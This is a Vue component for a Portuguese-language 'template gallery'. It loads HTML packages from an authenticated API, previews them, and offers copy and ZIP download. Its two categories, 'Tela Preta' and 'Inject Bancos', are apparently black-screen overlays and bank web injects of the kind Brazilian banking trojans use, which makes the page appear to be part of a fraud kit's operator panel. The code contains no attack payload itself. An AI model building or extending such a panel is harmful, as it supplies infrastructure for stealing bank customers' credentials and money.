<template>
  <div class="page-container">
    <div class="page-header">
      <div>
        <h1 class="page-title">Galeria de Templates 🎨</h1>
        <p class="page-sub">Explore, visualize e baixe pacotes HTML prontos para uso</p>
      </div>
      <div class="filter-tabs">
        <button :class="{ active: currentTab === 'screen' }" @click="setTab('screen')">Tela Preta</button>
        <button :class="{ active: currentTab === 'inject' }" @click="setTab('inject')">Inject Bancos</button>
      </div>
    </div>

    <div v-if="isLoading" class="loading">Carregando templates...</div>
    <div v-else-if="templates.length === 0" class="empty">Nenhum template disponível nesta categoria.</div>
    <div v-else class="templates-grid">
      <div v-for="tpl in templates" :key="tpl.id" class="tpl-card">
        <div class="tpl-preview">
          <iframe :srcdoc="tpl.html" class="preview-iframe" sandbox=""></iframe>
        </div>
        <div class="tpl-info">
          <h3>{{ tpl.title }}</h3>
          <p>{{ tpl.description }}</p>
          <div class="tpl-actions">
            <button class="btn btn-secondary" @click="copyHtml(tpl.html)">Copiar HTML 📋</button>
            <button class="btn btn-primary" @click="downloadZip(tpl)">Baixar .ZIP 📦</button>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script setup lang="ts">
import { ref, onMounted } from 'vue';
import axios from 'axios';

const API_URL = import.meta.env.VITE_API_URL || 'http://localhost/api';

const currentTab = ref('screen');
const templates = ref<any[]>([]);
const isLoading = ref(true);

const authHeaders = () => ({
  headers: { Authorization: `Bearer ${localStorage.getItem('token')}` }
});

const setTab = (tab: string) => {
  currentTab.value = tab;
  loadTemplates();
};

const loadTemplates = async () => {
  isLoading.value = true;
  try {
    const res = await axios.get(`${API_URL}/templates?galeria=${currentTab.value}`, authHeaders());
    templates.value = Array.isArray(res.data) ? res.data : [];
  } catch (err) {
    console.error('Erro ao carregar templates:', err);
  } finally {
    isLoading.value = false;
  }
};

const copyHtml = async (html: string) => {
  try {
    await navigator.clipboard.writeText(html);
    alert('Código HTML copiado para a área de transferência!');
  } catch (err) {
    alert('Não foi possível copiar. Seu navegador bloqueou o acesso.');
  }
};

const downloadZip = async (tpl: any) => {
  try {
    const res = await axios.get(`${API_URL}/templates/${tpl.id}/download`, {
      ...authHeaders(),
      responseType: 'blob',
    });
    const url = window.URL.createObjectURL(new Blob([res.data]));
    const a = document.createElement('a');
    a.href = url;
    a.download = `template_${tpl.id}.zip`;
    a.click();
    window.URL.revokeObjectURL(url);
  } catch (err) {
    alert('Erro ao baixar o ZIP.');
  }
};

onMounted(() => {
  loadTemplates();
});
</script>

<style scoped>
.page-container { display: flex; flex-direction: column; gap: 1.5rem; }
.page-header { display: flex; align-items: center; justify-content: space-between; }
.page-title { font-family: var(--font-display); font-size: 1.5rem; font-weight: 700; color: var(--ink); }
.page-sub { font-size: 0.875rem; color: var(--ink-muted); }

.filter-tabs { display: flex; gap: 0.5rem; background: var(--surface-1); padding: 0.25rem; border-radius: var(--r-sm); border: 1px solid var(--hairline); }
.filter-tabs button { background: none; border: none; padding: 0.5rem 1rem; color: var(--ink-muted); font-weight: 600; cursor: pointer; border-radius: var(--r-sm); }
.filter-tabs button.active { background: var(--surface-2); color: var(--ink); }

.templates-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 1.5rem; }
.tpl-card { background: var(--surface-1); border: 1px solid var(--hairline); border-radius: var(--r-lg); overflow: hidden; display: flex; flex-direction: column; }
.tpl-preview { height: 180px; background: #000; border-bottom: 1px solid var(--hairline); overflow: hidden; }
.preview-iframe { width: 100%; height: 100%; border: none; pointer-events: none; }

.tpl-info { padding: 1.25rem; display: flex; flex-direction: column; gap: 0.5rem; flex: 1; justify-content: space-between; }
.tpl-info h3 { font-size: 1rem; font-weight: 700; color: var(--ink); margin: 0; }
.tpl-info p { font-size: 0.8rem; color: var(--ink-muted); margin: 0; }

.tpl-actions { display: flex; gap: 0.75rem; margin-top: 1rem; }
.btn { padding: 0.5rem 0.875rem; border-radius: var(--r-sm); font-size: 0.8rem; font-weight: 600; border: none; cursor: pointer; text-decoration: none; text-align: center; }
.btn-primary { background: var(--accent); color: white; }
.btn-secondary { background: var(--surface-2); color: var(--ink); border: 1px solid var(--hairline); }

.loading, .empty { padding: 3rem; text-align: center; color: var(--ink-muted); }
</style>